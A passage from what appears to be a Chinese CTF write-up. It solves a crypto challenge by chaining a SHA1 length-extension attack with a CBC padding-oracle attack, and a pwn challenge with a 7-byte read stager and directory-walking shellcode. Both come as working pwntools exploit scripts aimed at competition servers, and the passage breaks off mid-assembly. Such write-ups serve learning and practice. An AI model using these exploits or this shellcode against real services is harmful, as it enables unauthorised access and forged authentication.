1011111110110111  
1000000000110111  
1111101111110111  
1111100000000111  
1111111111111111  
1111111111111111  
1111111111111111
正确的路径应该由地图坐标0xA5走到0x49，还原成字符串为：ddddwwwaaawwwddd，使用BLOWFISH加密可得flag为：db824ef8605c5235b4bbacfa2ff8e087
## Crypto
###  baby_crypto
**分析**
​
查看程序功能，可以看出程序首先会让我们输入用户密码，然后得到cookie和cookie的加盐哈希。之后要求输入`iv+cookie+hash`，解析cookie如果包含`;admin:1`且验证`sha1(cookie)==hash`通过就能得到flag。
**思路**
​
首先hash验证部分可以使用hash长度扩展攻击通过。分别输入用户`aaaaaaaaaa`密码`bbbbbbbbbb`·，则已知`sha1(salt+“admin:0;username:aaaaaaaaaa;password:bbbbbbbbbb”)`的值，使用`hashpumpy`可以得到`"admin:0;username:aaaaaaaaaa;password:bbbbbbbbbbx80x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x01xf8;admin:1x08x08x08x08x08x08x08x08"`的带salt的sha1。
    hash_ext = hashpumpy.hashpump('e998919db7d91e831e0382060e8d5b4742458af2',
     cookie_text, ';admin:1', 16)
    print(hash_ext)
​
之后就是构造出一组密文，AES解密能得到`"admin:0;username:aaaaaaaaaa;password:bbbbbbbbbbx80x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x01xf8;admin:1x08x08x08x08x08x08x08x08"`明文。由于加解密采用CBC模式，并且程序提供一个循环输入功能，而且在AES解密后会判断是否正常填充。所以可以使用`Padding
oracle
attack`，分组逐字节爆破密文，最后一组密文可以直接异或得到，所以需要爆破7组，每组16字节长，最多需要`260*16*7=28672`次。
**exp**
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    from pwn import *
    import time
    debug = 0
    # p = process("./crypto.py")
    # nc 207.148.68.109 20000
    p = remote("45.76.208.70",20000)
    # p = remote("207.148.68.109",20000)
    if debug:
        context.log_level = "debug"
    p.sendlineafter("name:n","a"*10)
    p.sendlineafter("word:n","b"*10)
    p.recvuntil("cookie:n")
    text = p.recvuntil("n")[:-1]
    # print text
    sha1 = text[-40:]
    print("sha1:",sha1)
    c7 = text[-72:-40]
    c6 = text[-104:-72]
    print("c7:",c7)
    result = "admin:0;username:aaaaaaaaaa;password:bbbbbbbbbbx80x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x01xf8;admin:1x08x08x08x08x08x08x08x08"
    re = []
    for i in range(len(result)/16):
        re.append(result[16*i:16*(i+1)])
    m1 = ";admin:1x08x08x08x08x08x08x08x08"
    m2 = "word:bbbbbbbbbbx01"
    c6 = int(m1.encode("hex"),16)^int(m2.encode("hex"),16)^int(c6,16)
    c6 = str(hex(c6)[2:])
    c6 = "0"*(16-len(c6))+c6
    print ("c6:",c6)
    p.sendlineafter("cookie:n",c6*2+c7+sha1)
    def oracle_app(c6,sha1):
        a = []
        for _ in range(16):
            a.append("61")
        for j in range(16):
            for i in range(0x100):
                print(j,i,)
                a[15-j]=str(hex(i)[2:])
                a[15-j] = "0"*(2-len(a[15-j]))+a[15-j]
                test_c5 = ""
                for n in range(16):
                    test_c5 += a[n]
                p.sendlineafter("cookie:n",test_c5*2+c6+sha1)
                message = p.recvuntil("n")[:-1]
                if message !="Invalid padding":
                    if j!=15:
                        a[15-j] = str(hex((j+1)^(j+2)^i)[2:])
                        a[15-j] = "0"*(2-len(a[15-j]))+a[15-j]
                        # print a[15-j]
                        for k in range(j):
                            a[15-k] = str(hex(int(a[15-k],16)^(j+1)^(j+2))[2:])
                            a[15-k] = "0"*(2-len(a[15-k]))+a[15-k]
                    break
        c5 = ""
        for n in range(16):
            c5 += a[n]
        return c5
    c5  = oracle_app(c6,sha1)
    c5  = int(c5,16)^int(re[6].encode("hex"),16)^int(("x10"*16).encode("hex"),16)
    c5 = hex(c5)[2:]
    c5 = "0"*(32-len(c5))+c5
    print c5
    c4  = oracle_app(c5,sha1)
    c4  = int(c4,16)^int(re[5].encode("hex"),16)^int(("x10"*16).encode("hex"),16)
    c4 = hex(c4)[2:]
    c4 = "0"*(32-len(c4))+c4
    print c4
    c3  = oracle_app(c4,sha1)
    c3  = int(c3,16)^int(re[4].encode("hex"),16)^int(("x10"*16).encode("hex"),16)
    c3 = hex(c3)[2:]
    c3 = "0"*(32-len(c3))+c3
    print c3
    c2  = oracle_app(c3,sha1)
    c2  = int(c2,16)^int(re[3].encode("hex"),16)^int(("x10"*16).encode("hex"),16)
    c2 = hex(c2)[2:]
    c2 = "0"*(32-len(c2))+c2
    print c2
    c1  = oracle_app(c2,sha1)
    c1  = int(c1,16)^int(re[2].encode("hex"),16)^int(("x10"*16).encode("hex"),16)
    c1 = hex(c1)[2:]
    c1 = "0"*(32-len(c1))+c1
    print c1
    c0  = oracle_app(c1,sha1)
    c0  = int(c0,16)^int(re[1].encode("hex"),16)^int(("x10"*16).encode("hex"),16)
    c0 = hex(c0)[2:]
    c0 = "0"*(32-len(c0))+c0
    print c0
    iv  = oracle_app(c0,sha1)
    iv  = int(iv,16)^int(re[0].encode("hex"),16)^int(("x10"*16).encode("hex"),16)
    iv = hex(iv)[2:]
    iv = "0"*(32-len(iv))+iv
    print iv+c0+c1+c2+c3+c4+c5+c6+c7
    # p.sendlineafter("cookie:n",c6*2+c7+sha1)
    p.interactive()
## Pwn
###  Shellcoder
这题允许输入7个字节的`shellcode`，我们首先使用`read`的系统调用，读入更多可执行的`shellcode`：
    sc = asm('''
        mov    dh,0xf
        xchg    rsi,rdi
           syscall
        ''')
然后，由于不能直接使用`shellcode`起`shell`，我们编写了利用`getdents`系统调用，递归查找`flag`文件的`shellcode`。最后打印出flag文件的内容。完整的利用脚本如下：
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    
    from pwn import *
    from time import sleep
    import base64
    context(os='linux', arch='amd64')
    context.log_level = 'debug'
    IS_DEBUG = 0
    prog = './shellcoder'
    if IS_DEBUG:
        r = process(prog)
        # r = process(prog, env={'LD_PRELOAD':'../libc/libc-2.28.so'})
    else:
        r = remote('139.180.215.222', 20002)
    elf = ELF(prog)
    libc = elf.libc
    def my_u64(byte_arr):
        padding = b'x00' * (8-len(byte_arr))
        res = byte_arr + padding
        return struct.unpack('<Q', res)[0]
    # gdb.attach(r, 'b *0x5555555544c7nc')
    sc = asm('''
        mov    dh,0xf
        xchg    rsi,rdi
           syscall
        ''')
    print('len_sc: %d' %len(sc))
    r.sendafter(':', sc)
    shellcode = asm('''
    init:    
        mov     r15, rsi 
        lea     rbp, [r15+0x3900]
        lea     rdi, [r15+0x300]
        mov     rsi, 0
    find_dir:
        sub     rbp, 0x320
        mov     [rbp-0x30], rdi
        mov     [rbp-0x40], rsi
        mov     rsi, 0x10000
        mov     rdi, [rbp-0x30]
        mov     rax, 2
        syscall
        mov     [rbp-0x28], rax
    chdir:
        mov     rdi, [rbp-0x30]
        mov     rax, 80
        syscall
    getdents:
        mov     rdi, [rbp-0x28]
        lea     rsi, [rbp-0x300]
        mov     rdx, 0x400
        mov     rax, 0x4e
        syscall
        mov     [rbp-8], rax
        cmp     rax, 0
        jz      out_loop1
        xor     r8, r8
        mov     [rbp-0x10], r8
    loop2:
        mov     eax, [rbp-0x10]
        cmp     eax, [rbp-8]
        jl      print_filename  
        jmp     getdents
    print_filename:    
        mov     eax, [rbp-0x10]
        cdqe
        lea     rdx, [rbp-0x300]
        add     rax, rdx
        mov     [rbp-0x18], rax
        add     rax, 0x12
        mov     [rbp-0x20], rax
    d_type: